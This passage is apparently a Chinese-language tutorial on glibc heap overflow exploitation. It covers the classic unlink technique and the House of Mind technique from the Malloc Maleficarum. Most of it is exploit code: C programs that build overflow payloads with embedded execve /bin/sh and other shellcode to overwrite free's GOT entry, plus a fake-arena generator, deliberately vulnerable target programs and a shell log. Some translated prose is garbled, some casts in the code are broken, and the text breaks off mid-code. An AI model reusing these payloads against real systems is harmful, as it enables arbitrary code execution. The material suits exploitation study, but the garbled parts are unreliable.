<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*  </span></span><br><span class="line"><span class="comment">  Heap overflow vulnerable program.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;      </span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span>  </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">         <span class="keyword">char</span> *first, *second;    </span><br><span class="line"> <span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );  </span><br><span class="line"> <span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );  </span><br><span class="line">         <span class="keyword">if</span>(argc!=<span class="number">1</span>)  </span><br><span class="line"> <span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );  </span><br><span class="line"> <span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );  </span><br><span class="line"> <span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );  </span><br><span class="line"> <span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上面程序的行[3]会导致堆溢出。用户输入<code>argv[1]</code>复制给了堆<code>缓冲区first</code>，没有任何大小限制。因此，当用户输入大于 666 字节时，它就会覆盖下一个块的头部。这个溢出会导致任意代码执行。</p>
<p><strong>unlink</strong>：这个技巧的核心思想，就是欺骗 <code>glibc malloc</code> 来 <code>unlink 第二个块</code>。<code>unlink free</code>的 <code>GOT 条目</code>会使其被 <code>shellcode</code> 地址覆盖。在成功覆盖之后，现在在行[5]，free被漏洞程序调用时，<code>shellcode</code>就会执行。</p>
<blockquote>
<p>首先我们了解一下<code>glibc malloc</code></p>
<p> <code>ptmalloc2</code>是从 <code>dlmalloc</code>分叉的。在<code>fork</code>之后，线程支持被添加到它并在2006年发布。在正式发布之后，<code>ptmalloc2</code>被集成到<code>glibc</code>源代码中。一旦集成，代码更改就直接转换为<code>glibc malloc</code>源代码本身。因此，<code>ptmalloc2</code>和<code>glibc</code>的<code>malloc</code>实现之间可能会有很多变化。曾经出现在这个岗位的<code>malloc</code>内部调用要么<code>BRK</code>或<code>MMAP系统调用</code>。由于<code>tmalloc2</code>的线程支持，它成为了<code>nux的默认内存分配器</code>。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在<code>dlmalloc</code>中，当两个线程同时调用<code>malloc</code>时，只有一个线程可以进入<code>临界区</code>，因为<code>freelist数据结构</code>在所有可用线程之间共享。因此，内存分配在多线程应用程序中需要时间，从而导致性能下降。在<code>ptmalloc2</code>中，当两个线程<code>同时调用malloc</code>时，会立即分配内存，因为每个线程都维护一个单独的堆段，因此维护这些堆的空列表数据结构也是分开的。每个线程竞技场。</p>
</blockquote>
<p><strong>多个竞技场时：</strong></p>
<p>​      • 当主线程，第一次调用<code>malloc</code>已经创建主竞技场时，没有任何争用。</p>
<p>​      • 当线程1和线程2<code>第一次调用malloc</code>时，会为它们创建一个新的竞技场，并且它的使用没有任何争用。直到这一点，线程和竞技场都有一对一的映射。</p>
<p>​      • 当线程3<code>第一次调用malloc</code>时，<code>计算竞技场限制的数量</code>。这里竞技场限制被越过，因此尝试重用现有竞技场（主竞技场或竞技场1或竞技场2）</p>
<p>​      • 重用：</p>
<p>​           • 一旦环绕可用的竞技场，循环尝试锁定该竞技场。</p>
<p>​           • 如果成功锁定（让主竞技场成功锁定），请将该竞技场返回给用户。</p>
<p>​           • 如果没有发现任何竞技场，则  排在下一个竞技场。</p>
<p>​      • 现在当线程3调用<code>malloc</code>（第二次）时，<code>malloc</code>将尝试使用最后访问的竞技场（主竞技场）。如果主竞技场是免费的，则其使用的其他<code>thread3</code>将被阻止，直到主竞技场被释放。<code>因此现在主要的竞技场在主线程和线程3之间共享。</code></p>
<p><strong>利用程序：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Program to exploit 'test' using unlink technique. */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;      </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> FUNCTION_POINTER ( 0x0804978c )         <span class="comment">//Address of GOT entry for free function obtained using "objdump -R vuln".  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> CODE_ADDRESS ( 0x0804a008 + 0x10 )      <span class="comment">//Address of variable 'first' in vuln executable.      </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> VULNERABLE <span class="meta-string">"./test"</span>  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> DUMMY 0xdefaced  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1     </span></span><br><span class="line"> <span class="keyword">char</span> shellcode[] =  </span><br><span class="line">        <span class="comment">/* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function </span></span><br><span class="line"><span class="comment">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function.  </span></span><br><span class="line"><span class="comment">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</span>  </span><br><span class="line">        <span class="string">"\xeb\x0assppppffff"</span>               <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">        <span class="keyword">char</span> * p;  </span><br><span class="line">        <span class="keyword">char</span> argv1[ <span class="number">680</span> + <span class="number">1</span> ];  </span><br><span class="line">        <span class="keyword">char</span> * argv[] = &#123; VULNERABLE, argv1, <span class="literal">NULL</span> &#125;;  </span><br><span class="line">        p = argv1;  </span><br><span class="line">        <span class="comment">/* the fd field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the bk field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the fd_nextsize field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">       <span class="comment">/* the bk_nextsize field of the first chunk */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( DUMMY );  </span><br><span class="line">       p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* Copy the shellcode */</span>  </span><br><span class="line">        <span class="built_in">memcpy</span>( p, shellcode, <span class="built_in">strlen</span>(shellcode) );  </span><br><span class="line">        p += <span class="built_in">strlen</span>( shellcode );  </span><br><span class="line">       <span class="comment">/* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize  </span></span><br><span class="line"><span class="comment">        of first chunk */</span>  </span><br><span class="line">        <span class="built_in">memset</span>( p, <span class="string">'B'</span>, (<span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span>) - (<span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode)) );  </span><br><span class="line">        p += ( <span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span> ) - ( <span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode) );  </span><br><span class="line">        <span class="comment">/* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</span>  </span><br><span class="line">        *( (<span class="keyword">size_t</span>)p ) = *<span class="keyword">size_t</span>)( DUMMY &amp; ~PREV_INUSE );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</span>  </span><br><span class="line">        *( (<span class="keyword">size_t</span>)p ) = (<span class="keyword">size_t</span>)( <span class="number">-4</span> );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function </span></span><br><span class="line"><span class="comment">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in  </span></span><br><span class="line"><span class="comment">       second chunk's bk field (see below) */</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( FUNCTION_POINTER - <span class="number">12</span> );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the bk field of the second chunk. It should point to shell code address.*/</span>  </span><br><span class="line">        *( (<span class="keyword">void</span>)p ) = (<span class="keyword">void</span>)( CODE_ADDRESS );  </span><br><span class="line">        p += <span class="number">4</span>;  </span><br><span class="line">        <span class="comment">/* the terminating NUL character */</span>  </span><br><span class="line">        *p = '';  </span><br><span class="line">        <span class="comment">/* the execution of the vulnerable program */</span>  </span><br><span class="line">        execve( argv[<span class="number">0</span>], argv, <span class="literal">NULL</span> );  </span><br><span class="line">        <span class="keyword">return</span>( <span class="number">-1</span> );  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行上述程序会派生新的 <code>shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">szt@ubuntu:~/linux exploit/test9$ $ gcc -g -z norelro -z execstack -o test test.c -Wl,--rpath=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so.  </span><br><span class="line">szt@ubuntu:~/linux exploit/test9$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c  </span><br><span class="line">szt@ubuntu:~/linux exploit/test9$ ./<span class="built_in">exp</span>   </span><br><span class="line">szt@ubuntu:~/linux exploit/test9$ ls  </span><br><span class="line"><span class="built_in">exp</span>.c  <span class="built_in">exp</span>.c~  test  test.c</span><br></pre></td></tr></table></figure>

<p>但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。</p>
<hr>
<h2 id="使用-Malloc-Maleficarum-的堆溢出"><a href="#使用-Malloc-Maleficarum-的堆溢出" class="headerlink" title="使用 Malloc Maleficarum 的堆溢出"></a>使用 Malloc Maleficarum 的堆溢出</h2><p>虚拟机：Ubuntu 12.04（x86）</p>
<p>glibc malloc 变得更可靠了。之后，类似 unlink 的技巧已经废弃，攻击者没有线索。但是在 2005 年末，Phantasmal Phatasmagoria 带来了下面这些技巧，用于成功利用堆溢出。</p>
<blockquote>
<p>• House of Prime</p>
<p>• House of Mind</p>
<p>• House of Force</p>
<p>• House of Lore</p>
<p>• House of Spirit</p>
</blockquote>
<p><strong>House of Mind</strong></p>
<p>这个技巧中，攻击者欺骗 <code>glibc malloc</code> 来使用由他伪造的 <code>arena</code>。伪造的 <code>arena</code> 以这种形式构造，<code>unsorted bin</code> 的 <code>fd</code>包含<code>free的 GOT 条目地址 -12</code>。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 <code>shellcode</code> 的地址。在成功覆盖 GOT 之后，当漏洞程序调用<code>free</code>，<code>shellcode</code> 就会执行。</p>
<p>这个需要先决条件：</p>
<p>• 在块的地址之前，需要一系列 <code>malloc 调用</code>– 当对齐到内存区域中<code>HEAP_MAX_SIZE</code>结果的倍数的时候，内存区域由攻击者控制。这是伪造的<code>heap_info</code>结构所在的内存区域。<code>伪造的heap_info</code>的 <code>arena 指针ar_ptr</code>会指向<code>伪造的 arena</code>。因此伪造的 <code>arena</code> 和<code>伪造的heap_info</code>的内存区域都能由攻击者控制。</p>
<p>• 一个块，它的大小字段（以及它的 arena 指针 – 预备条件 1）由攻击者控制，应该已释放。</p>
<p>• 上述空闲块的下一个块应该不是 <code>top</code> 块。</p>
<p><strong>漏洞程序：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* test.c </span></span><br><span class="line"><span class="comment"> House of Mind vulnerable program </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;      </span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;  </span><br><span class="line">     <span class="keyword">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* First allocated chunk */</span>  </span><br><span class="line">     <span class="keyword">char</span> *ptr2; <span class="comment">/* Second chunk/Last but one chunk */</span>  </span><br><span class="line">     <span class="keyword">char</span> *ptr3; <span class="comment">/* Last chunk */</span>  </span><br><span class="line">     <span class="keyword">int</span> heap = (**<span class="keyword">int</span>**)ptr &amp; <span class="number">0xFFF00000</span>;  </span><br><span class="line">     <span class="keyword">_Bool</span> found = <span class="number">0</span>;  </span><br><span class="line">     <span class="keyword">int</span> i = <span class="number">2</span>;     </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; <span class="number">1024</span>; i++) &#123;  </span><br><span class="line">   <span class="comment">/* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */</span>  </span><br><span class="line">   <span class="comment">/* 0x08100000 is the place where fake heap_info structure is found. */</span>  </span><br><span class="line">   [<span class="number">1</span>]**<span class="keyword">if</span>** (!found &amp;&amp; (((**<span class="keyword">int</span>**)(ptr2 = <span class="built_in">malloc</span>(<span class="number">1024</span>)) &amp; <span class="number">0xFFF00000</span>) == \  </span><br><span class="line">      (heap + <span class="number">0x100000</span>))) &#123;  </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"good heap allignment found on malloc() %i (%p)\n"</span>, i, ptr2);  </span><br><span class="line">       found = <span class="number">1</span>;  </span><br><span class="line">       <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line"> [<span class="number">2</span>]ptr3 = <span class="built_in">malloc</span>(<span class="number">1024</span>); <span class="comment">/* Last chunk. Prereq 3: Next chunk to ptr2 != av-&gt;top */</span>  </span><br><span class="line"> <span class="comment">/* User Input. */</span>  </span><br><span class="line"> [<span class="number">3</span>]fread (ptr, <span class="number">1024</span> * <span class="number">1024</span>, <span class="number">1</span>, <span class="built_in">stdin</span>);     </span><br><span class="line"> [<span class="number">4</span>]<span class="built_in">free</span>(ptr2); <span class="comment">/* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */</span>  </span><br><span class="line"> [<span class="number">5</span>]<span class="built_in">free</span>(ptr3); <span class="comment">/* Shell code execution. */</span>  </span><br><span class="line"> <span class="keyword">return</span>(<span class="number">0</span>); <span class="comment">/* Bye */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞程序的<code>行[3]</code>是堆溢出发生的地方。用户输入储存在块 1 的<code>mem指针</code>处，大小共计 <code>1MB</code>。所以为了成功利用堆溢出，攻击者提供了下面的用户输入。</p>
<p><strong>利用程序：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* exp.c </span></span><br><span class="line"><span class="comment"> Program to generate attacker data. </span></span><br><span class="line"><span class="comment"> Command: </span></span><br><span class="line"><span class="comment">      #./exp &gt; file </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BIN1 0xb7fd8430    </span></span><br><span class="line"> <span class="keyword">char</span> scode[] =  </span><br><span class="line"><span class="comment">/* Shellcode to execute linux command "id". Size - 72 bytes. */</span>  </span><br><span class="line"><span class="string">"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"</span>  </span><br><span class="line"><span class="string">"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"</span>  </span><br><span class="line"><span class="string">"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"</span>  </span><br><span class="line"><span class="string">"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"</span>  </span><br><span class="line"><span class="string">"\x5e\x9e\x39\xcb\xbf\x04\xea\x42"</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> ret_str[<span class="number">4</span>] = <span class="string">"\x00\x00\x00\x00"</span>;     </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert_endianess</span><span class="params">(<span class="keyword">int</span> arg)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;  </span><br><span class="line">        ret_str[<span class="number">3</span>] = (arg &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;  </span><br><span class="line">        ret_str[<span class="number">2</span>] = (arg &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;  </span><br><span class="line">        ret_str[<span class="number">1</span>] = (arg &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>;  </span><br><span class="line">        ret_str[<span class="number">0</span>] = (arg &amp; <span class="number">0x000000FF</span>) &gt;&gt; <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span>  </span><br><span class="line">        <span class="comment">/* Fake Arena. */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* mutex */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x01\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* flag */</span>  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)  </span><br><span class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fastbinsY */</span>  </span><br><span class="line">        fwrite(<span class="string">"\xb0\x0e\x10\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* top */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* last_remainder */</span>  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">127</span>;i++) &#123;  </span><br><span class="line">                convert_endianess(BIN1+(i*<span class="number">8</span>));  </span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">119</span>) &#123;  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve prev_size */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* preserve size */</span>  </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>) &#123;  </span><br><span class="line">                        fwrite(<span class="string">"\xe8\x98\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] = (GOT(free) - 12) */</span>  </span><br><span class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span>  </span><br><span class="line">                &#125;  </span><br><span class="line">               <span class="keyword">else</span> &#123;  </span><br><span class="line">                        fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][0] */</span>  </span><br><span class="line">                       fwrite(ret_str, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bins[i][1] */</span>  </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;  </span><br><span class="line">                fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* binmap[i] */</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">        fwrite(<span class="string">"\x00\x84\xfd\xb7"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* next_free */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* system_mem */</span>  </span><br><span class="line">        fwrite(<span class="string">"\x00\x60\x0c\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* max_system_mem */</span>  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">234</span>;i++) &#123;  </span><br><span class="line">                fwrite(<span class="string">"\x41\x41\x41\x41"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">722</span>;i++) &#123;  </span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">721</span>) &#123;  </span><br><span class="line">                       <span class="comment">/* Chunk 724 contains the shellcode. */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\xeb\x18\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size  - Jmp 24 bytes */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x0d\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* fd_nextsize */</span>                           fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* bk_nextsize */</span>                           fwrite(<span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span> \  </span><br><span class="line">                       <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="built_in">stdout</span>);  <span class="comment">/* NOPS */</span>  </span><br><span class="line">                     